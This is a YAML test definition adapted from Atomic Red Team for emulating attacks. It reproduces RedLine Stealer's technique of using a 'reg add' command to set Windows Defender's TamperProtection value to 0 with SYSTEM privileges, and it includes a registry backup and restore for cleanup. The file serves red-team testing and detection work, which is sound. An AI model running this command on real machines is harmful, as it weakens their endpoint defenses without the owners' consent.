# Converted from Atomic Red Team - Modify Registry
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
# Original auto_generated_guid: 3b625eaa-c10d-4635-af96-3eae7d2a2f3c

---
api_version: 2.0
uuid: efab1efb-b374-494a-8bc1-33a319b034e7
name: Tamper Win Defender Protection
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry.
  Take note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that
  tries to tamper this Win Defender feature settings.

  This TTP requires SYSTEM privileges to execute.

mitre:
  tactics:
    - "TA0005 Defense Evasion"
  techniques:
    - "T1112 Modify Registry"

requirements:
  platforms:
    - os: windows
  superuser: true

args:
  - name: backup_location
    description: Path where registry backup will be saved
    type: path
    default: "C:\\Users\\Public\\backup.reg"

steps:
  - name: backup_registry
    executor: cmd.exe
    inline: |
      reg export "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" "{{.Args.backup_location}}" /y 2>nul

  - name: tamper_defender_protection
    executor: cmd.exe
    inline: |
      reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
    cleanup:
      executor: cmd.exe
      inline: |
        reg import "{{.Args.backup_location}}" 2>nul
        del "{{.Args.backup_location}}" /f /q 2>nul
